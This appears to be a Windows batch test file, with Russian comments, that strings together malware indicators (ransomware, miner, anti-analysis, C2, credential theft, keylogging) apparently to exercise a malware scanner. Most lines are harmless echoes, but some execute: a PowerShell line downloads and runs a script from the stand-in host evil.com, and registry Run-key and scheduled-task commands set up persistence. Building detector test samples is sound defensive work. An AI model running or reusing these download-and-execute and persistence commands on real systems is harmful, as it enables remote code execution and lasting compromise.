@echo off
REM Тестовый файл с множественными подозрительными паттернами
echo [TEST] Starting malicious simulation...

REM Ransomware индикаторы
echo Encrypting files with bitcoin ransom demand
echo Your files have been encrypted - pay 1 BTC to decrypt
echo Extensions: .locked .crypto .encrypted

REM Miner индикаторы  
echo Connecting to stratum+tcp://pool.mining.com:3333
echo XMRig miner started - cryptonight algorithm
echo CPU usage: 95%

REM Anti-analysis
echo Checking for VirtualBox, VMware, Sandbox
echo IsDebuggerPresent check...
echo Wireshark detected - exiting

REM PowerShell obfuscation
powershell -enc SGVsbG8gV29ybGQ=
powershell -EncodedCommand ABC123
iex (New-Object System.Net.WebClient).DownloadString('http://evil.com/malware.ps')

REM C2 communication
echo Beacon to C2 server established
echo Implant active on target system

REM Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v malware /t REG_SZ /d "C:\malware.exe" /f
schtasks /create /tn "MalwareTask" /tr "C:\malware.exe" /sc ONLOGON

REM Credential theft
echo Stealing passwords from browsers
echo Dumping credentials with mimikatz
echo Accessing crypto wallets

REM Keylogging
echo Installing keyboard hook
echo Logging keystrokes to C:\temp\keys.log

REM Network attacks
echo Starting DDoS flood attack
echo Scanning network shares for lateral movement
